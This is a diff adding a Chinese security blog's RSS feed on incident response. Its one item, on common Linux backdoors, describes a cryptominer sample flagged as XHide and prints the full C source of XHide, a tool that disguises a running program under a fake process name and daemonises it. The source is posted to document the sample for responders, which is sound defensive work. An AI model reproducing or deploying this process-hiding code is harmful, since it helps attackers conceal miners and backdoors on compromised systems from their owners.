@@ -1,0 +1,251 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>应急响应 on 清夜无尘の一方天地</title>
+    <link>https://wander1ng.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</link>
+    <description>Recent content in 应急响应 on 清夜无尘の一方天地</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>cn</language>
+    <copyright>Copyright © 2019–2024</copyright>
+    <lastBuildDate>Fri, 22 Nov 2024 17:49:53 +0800</lastBuildDate>
+    
+	<atom:link href="https://wander1ng.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Linux常见后门及排查技术</title>
+      <link>https://wander1ng.com/post/linux%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</link>
+      <pubDate>Fri, 22 Nov 2024 17:49:53 +0800</pubDate>
+      
+      <guid>https://wander1ng.com/post/linux%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</guid>
+      <description>&lt;p&gt;今天遇到一个清华的现场，从C2取回样本来发现是Linux挖矿的，VT检出是Xhide，由此延伸记录一下。&lt;/p&gt;
+&lt;h4 id=&#34;常见技巧之添加root权限后门用户&#34;&gt;常见技巧之添加Root权限后门用户&lt;/h4&gt;
+&lt;p&gt;最后贴一下Github上的xhide源代码：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/stat.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;pwd.h&amp;gt;
+#include &amp;lt;grp.h&amp;gt;
+
+void usage(char *progname);
+
+int changeown (char *str)
+{
+	char user[256], *group;
+	struct passwd *pwd;
+	struct group *grp;
+
+	uid_t uid;
+	gid_t gid;
+
+	memset(user, &amp;#39;\0&amp;#39;, sizeof(user));
+	strncpy(user, str, sizeof(user));
+
+	for (group = user; *group; group++)
+		if (*group == &amp;#39;:&amp;#39;)
+		{
+			*group = &amp;#39;\0&amp;#39;;
+			group++;
+			break;
+		}
+
+	if (pwd = getpwnam(user)) 
+	{
+
+		uid = pwd-&amp;gt;pw_uid;
+		gid = pwd-&amp;gt;pw_gid;
+	} else uid = (uid_t) atoi(user);
+
+	if (*group)
+		if (grp = getgrnam(group)) gid = grp-&amp;gt;gr_gid;
+		else gid = (gid_t) atoi(group);
+
+	if (setgid(gid)) {
+		perror(&amp;#34;Error: Can&amp;#39;t set GID&amp;#34;);
+		return 0;
+	}
+
+	if (setuid(uid))
+	{
+		perror(&amp;#34;Error: Can&amp;#39;t set UID&amp;#34;);
+		return 0;
+	}
+
+	return 1;
+}
+
+char *fullpath(char *cmd)
+{
+	char *p, *q, *filename;
+	struct stat st;
+
+	if (*cmd == &amp;#39;/&amp;#39;)
+		return cmd;
+
+	filename = (char *) malloc(256);
+
+	if  (*cmd == &amp;#39;.&amp;#39;)
+		if (getcwd(filename, 255) != NULL)
+		{
+			strcat(filename, &amp;#34;/&amp;#34;);
+			strcat(filename, cmd);
+			return filename;
+		}
+		else
+			return NULL;
+
+	for (p = q = (char *) getenv(&amp;#34;PATH&amp;#34;); q != NULL; p = ++q)
+	{
+		if (q = (char *) strchr(q, &amp;#39;:&amp;#39;))
+			*q = (char) &amp;#39;\0&amp;#39;;
+
+		snprintf(filename, 256, &amp;#34;%s/%s&amp;#34;, p, cmd);
+
+		if (stat(filename, &amp;amp;st) != -1
+				&amp;amp;&amp;amp; S_ISREG(st.st_mode)
+				&amp;amp;&amp;amp; (st.st_mode&amp;amp;S_IXUSR || st.st_mode&amp;amp;S_IXGRP || st.st_mode&amp;amp;S_IXOTH))
+			return filename;
+
+		if (q == NULL)
+			break;
+	}
+
+	free(filename);
+
+	return NULL;
+
+}
+
+void usage(char *progname)
+{
+	fprintf(stderr, &amp;#34;XHide - Process Faker, by Schizoprenic &amp;#34;
+			&amp;#34;Xnuxer Research (c) 2002\n\nOptions:\n&amp;#34;
+
+			&amp;#34;-s string\tFake name process\n&amp;#34;
+			&amp;#34;-d\t\tRun aplication as daemon/system (optional)\n&amp;#34; 
+			&amp;#34;-u uid[:gid]\tChange UID/GID, use another user (optional)\n&amp;#34; 
+			&amp;#34;-p filename\tSave PID to filename (optional)\n\n&amp;#34;
+
+			&amp;#34;Example: %s -s \&amp;#34;klogd -m 0\&amp;#34; -d -p test.pid ./egg bot.conf\n\n&amp;#34;,progname);
+
+	exit(1);
+}
+
+int main(int argc,char **argv)
+{
+	char c;
+	char fake[256];
+	char *progname, *fakename;
+	char *pidfile, *fp;
+	char *execst;
+
+	FILE *f;
+
+	int runsys=0, null;
+	int j,i,n,pidnum;
+	char **newargv;
+
+	progname = argv[0];
+	if(argc&amp;lt;2) usage(progname);
+
+	for (i = 1; i &amp;lt; argc; i++)
+	{
+		if (argv[i][0] == &amp;#39;-&amp;#39;)
+			switch (c = argv[i][1])
+			{
+
+				case &amp;#39;s&amp;#39;: fakename = argv[++i]; break;
+				case &amp;#39;u&amp;#39;: changeown(argv[++i]); break; 
+				case &amp;#39;p&amp;#39;: pidfile = argv[++i]; break;
+				case &amp;#39;d&amp;#39;: runsys = 1; break;
+
+				default:  usage(progname); break;
+			}
+		else break;
+	}
+
+	if (!(n = argc - i) || fakename == NULL) usage(progname);
+
+	newargv = (char **) malloc(n * sizeof(char **) + 1);
+	for (j = 0; j &amp;lt; n; i++,j++) newargv[j] = argv[i];
+	newargv[j] = NULL;
+
+	if ((fp = fullpath(newargv[0])) == NULL) { perror(&amp;#34;Full path seek&amp;#34;); exit(1); }
+	execst = fp;
+
+	if (n &amp;gt; 1)
+	{
+		memset(fake, &amp;#39; &amp;#39;, sizeof(fake) - 1);
+		fake[sizeof(fake) - 1] = &amp;#39;\0&amp;#39;;
+		strncpy(fake, fakename, strlen(fakename));
+		// Kent, this is the key point.. keke
+		newargv[0] = fake;
+		/*for (int i = 1; i &amp;lt; n; i++) newargv[i] = &amp;#34;&amp;#34;;*/
+	}
+	else newargv[0] = fakename;
+
+	if (runsys) 
+	{
+		if ((null = open(&amp;#34;/dev/null&amp;#34;, O_RDWR)) == -1)
+		{
+			perror(&amp;#34;Error: /dev/null&amp;#34;);
+			return -1;
+		}
+
+		switch (fork())
+		{
+			case -1:
+				perror(&amp;#34;Error: FORK-1&amp;#34;);
+				return -1;
+
+			case  0:
+				setsid();
+				switch (fork())
+				{
+
+					case -1:
+						perror(&amp;#34;Error: FORK-2&amp;#34;);
+						return -1;
+
+					case  0:
+						umask(0);
+						close(0);
+						close(1);
+						close(2);
+						dup2(null, 0);
+						dup2(null, 1);
+						dup2(null, 2);
+
+						break;
+
+					default:
+						return 0;
+				}
+				break;
+			default:
+				return 0;
+		}
+	}
+
+	waitpid(-1, (int *)0, 0);        
+	pidnum = getpid();
+
+	if (pidfile != NULL &amp;amp;&amp;amp; (f = fopen(pidfile, &amp;#34;w&amp;#34;)) != NULL)
+	{
+		fprintf(f, &amp;#34;%d\n&amp;#34;, pidnum);
+		fclose(f);
+	}
+
+	fprintf(stderr,&amp;#34;==&amp;gt; Fakename: %s PidNum: %d\n&amp;#34;,fakename,pidnum); 
+	execv(execst, newargv);
+	perror(&amp;#34;Couldn&amp;#39;t execute&amp;#34;);
+	return -1;
+}
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+  </channel>
+</rss>
